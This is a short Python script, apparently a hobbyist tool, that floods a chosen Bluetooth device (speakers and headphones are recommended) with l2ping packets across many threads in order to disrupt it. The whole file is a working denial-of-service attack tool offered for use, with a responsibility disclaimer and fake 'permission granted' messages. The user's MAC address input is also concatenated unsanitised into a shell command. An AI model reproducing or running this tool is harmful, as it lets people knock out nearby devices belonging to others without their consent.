import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print(' This tool was made for fun and private use only!')
    print(' ____    _    ____ _____  _    ____  ____  ')
    print('| __ )  / \  / ___|_   _|/ \  |  _ \|  _ \ ')   
    print('|  _ \ / _ \ \___ \ | | / _ \ | |_) | | | |')
    print('| |_) / ___ \ ___) || |/ ___ \|  _ <| |_| |')
    print('|____/_/   \_\____/ |_/_/   \_\_| \_\____/ ')
def main():
    printLogo()
    time.sleep(0.1)
    print('\x1b[31m\nTry to target receiver devices like Speaker,Headphones,etc because it becomes 90% more effective than targetting sender devices!!Iam not responsible if you misuse this tool in any way!!')
    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
        time.sleep(1)
        os.system('clear')
        printLogo()
        print('')

        target_addr = input('Enter Mac address of bluetooth device > ')

        if len(target_addr) < 1:
            print('[!] ERROR: Enter the Mac address NOOB')
            exit(0)

        try:
            packages_size = int(input('Enter packages to be sent > '))
        except:
            print('[!] ERROR: Packages must be an Integer NOOB')
            exit(0)
        try:
            threads_count = int(input('Enter Count of threads > '))
        except:
            print('[!] ERROR: Threads count must be an integer Noob')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Executing Attack")
        time.sleep(0.1)
        print("Connecting with servers of Samrat")
        time.sleep(2)
        print("Asking for permissions with Mr. Bastard")
        time.sleep(3)
        print("Permission Granted!!")
        time.sleep(1.5)
        print("Starting attack in 3 sec...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] All thread have been built...')
        print('[*] Sending Packages to target...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
